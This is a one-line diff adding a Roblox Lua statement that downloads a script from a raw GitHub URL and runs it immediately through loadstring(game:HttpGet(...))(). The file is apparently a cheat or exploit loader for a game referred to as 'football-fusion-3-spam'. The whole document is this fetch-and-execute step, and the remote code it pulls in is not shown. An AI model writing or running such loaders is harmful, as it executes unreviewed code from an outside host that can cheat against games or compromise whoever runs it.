@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/football-fusion-3-spam5-9mb3odl8jfbseq.lua"))()
